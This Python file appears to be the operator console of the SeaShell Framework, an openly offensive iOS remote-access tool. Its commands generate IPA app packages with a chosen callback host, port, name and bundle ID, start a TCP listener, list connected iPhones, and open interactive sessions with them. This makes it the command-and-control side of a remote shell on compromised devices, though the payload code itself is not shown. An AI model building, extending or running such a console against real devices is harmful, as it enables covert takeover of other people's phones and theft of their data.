"""
MIT License

Copyright (c) 2020-2023 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import cmd
import sys
import threading

from badges import Badges, Tables

from seashell.core.device import (
    Device,
    DeviceHandler,
    DeviceGenerator
)


class Console(cmd.Cmd):
    """ Subclass of seashell.core module.

    This subclass of seashell.core modules is intended for providing
    main SeaShell Framework console interface.
    """

    def __init__(self) -> None:
        super().__init__()
        cmd.Cmd.__init__(self)

        self.badges = Badges()
        self.tables = Tables()

        self.handler = None
        self.thread = None

        self.devices = {}
        self.banner = """%clear%end
           _.-''|''-._
        .-'     |     `-.
      .'\\       |       /`.
    .'   \\      |      /   `.
    \\     \\     |     /     /
     `\\    \\    |    /    /'
       `\\   \\   |   /   /'
         `\\  \\  |  /  /'
        _.-`\\ \\ | / /'-._
       {_____`\\\\|//'_____}
               `-'
  ~~ %bold%whiteApples are bad, shells are awesome!%end ~~

--=[ %bold%whiteSeaShell Framework 1.0.0%end
--=[ Developed by EntySec (%linehttps://entysec.com/%end)
"""

        self.prompt = '(seashell)> '

    def handle_device(self) -> None:
        """ Thread to handle devices.

        :return None: None
        """

        device = self.handler.handle()

        self.devices.update({
            len(self.devices): {
                'host': device.host,
                'port': str(device.port),
                'device': device
            }
        })

        self.badges.print_empty("")

        self.badges.print_information(
            f"Type %greendevices%end to list all connected devices.")
        self.badges.print_information(
            f"Type %greeninteract {str(len(self.devices) - 1)}%end "
            "to interact this device."
        )

    def do_help(self, _) -> None:
        """ Show available commands.

        :return None: None
        """

        self.tables.print_table("Core Commands", ('Command', 'Description'), *sorted([
            ('clear', 'Clear terminal window.'),
            ('devices', 'Show connected devices.'),
            ('kill', 'Kill device.'),
            ('listen', 'Start listener in background.'),
            ('ipa', 'Generate IPA.'),
            ('exit', 'Exit SeaShell Framework.'),
            ('help', 'Show available commands.'),
            ('interact', 'Interact with device.')
        ]))

    def do_exit(self, _) -> None:
        """ Exit SeaShell Framework.

        :return None: None
        :raises EOFError: EOF error
        """

        for device in list(self.devices):
            self.devices[device]['device'].kill()
            del self.devices[device]

        raise EOFError

    def do_clear(self, _) -> None:
        """ Clear terminal window.

        :return None: None
        """

        self.badges.print_empty('%clear', end='')

    def do_ipa(self, args: str) -> None:
        """ Generate IPA.

        :param str args: arguments
        :return None: None
        """

        args = args.split()

        if len(args) < 3:
            self.badges.print_usage("ipa <host> <port> <path> [name] [bundle_id]")
            return

        host, port, path = args[0], args[1], args[2]
        generator = DeviceGenerator(host, port)

        if len(args) >= 5:
            name, bundle_id = args[3], args[4]

            self.badges.print_process(f"Setting application {name} {bundle_id}...")
            generator.set_name(name, bundle_id)

        self.badges.print_process(f"Generating IPA to {path}...")
        generator.generate(path)

        self.badges.print_success(f"Save IPA to {path}/{generator.app_name}.ipa!")

    def do_listen(self, pair: str) -> None:
        """ Start TCP listener.

        :param str pair: host port pair
        :return None: None
        """

        pair = pair.split()

        if len(pair) < 2:
            self.badges.print_usage("listen <host> <port> [timeout]")
            return

        if len(pair) > 3:
            host, port, timeout = pair[0], int(pair[1]), int(pair[2])
        else:
            host, port = pair[0], int(pair[1])
            timeout = None

        self.handler = DeviceHandler(host, port, timeout)
        self.handler.start()

        self.thread = threading.Thread(target=self.handle_device)
        self.thread.setDaemon(True)
        self.thread.start()

    def do_devices(self, _) -> None:
        """ Show connected devices.

        :return None: None
        """

        if not self.devices:
            self.badges.print_warning("No devices connected.")
            return

        devices = []

        for device in self.devices:
            devices.append(
                (device, self.devices[device]['host'],
                 self.devices[device]['port']))

        self.tables.print_table("Connected Devices", ('ID', 'Host', 'Port'), *devices)

    def do_kill(self, device_id: int) -> None:
        """ Kill device.

        :param int device_id: device ID
        :return None: None
        """

        if not device_id:
            self.badges.print_usage("kill <id>")
            return

        device_id = int(device_id)

        if device_id not in self.devices:
            self.badges.print_error("Invalid device ID!")
            return

        self.devices[device_id]['device'].kill()
        self.devices.pop(device_id)

    def do_interact(self, device_id: int) -> None:
        """ Interact with device.

        :param int device_id: device ID
        """

        if not device_id:
            self.badges.print_usage("interact <id>")
            return

        device_id = int(device_id)

        if device_id not in self.devices:
            self.badges.print_error("Invalid device ID!")
            return

        self.badges.print_process(f"Interacting with device {str(device_id)}...")
        self.devices[device_id]['device'].interact()

    def do_EOF(self, _):
        """ Catch EOF.

        :return None: None
        :raises EOFError: EOF error
        """

        raise EOFError

    def default(self, line: str) -> None:
        """ Default unrecognized command handler.

        :param str line: line sent
        :return None: None
        """

        self.badges.print_error(f"Unrecognized command: {line.split()[0]}!")

    def emptyline(self) -> None:
        """ Do something on empty line.

        :return None: None
        """

        pass

    def shell(self) -> None:
        """ Run console shell.

        :return None: None
        """

        self.badges.print_empty(self.banner, translate=False)

        while True:
            try:
                cmd.Cmd.cmdloop(self)

            except (EOFError, KeyboardInterrupt):
                self.badges.print_empty(end='')
                break

            except Exception as e:
                self.badges.print_error("An error occurred: " + str(e) + "!")
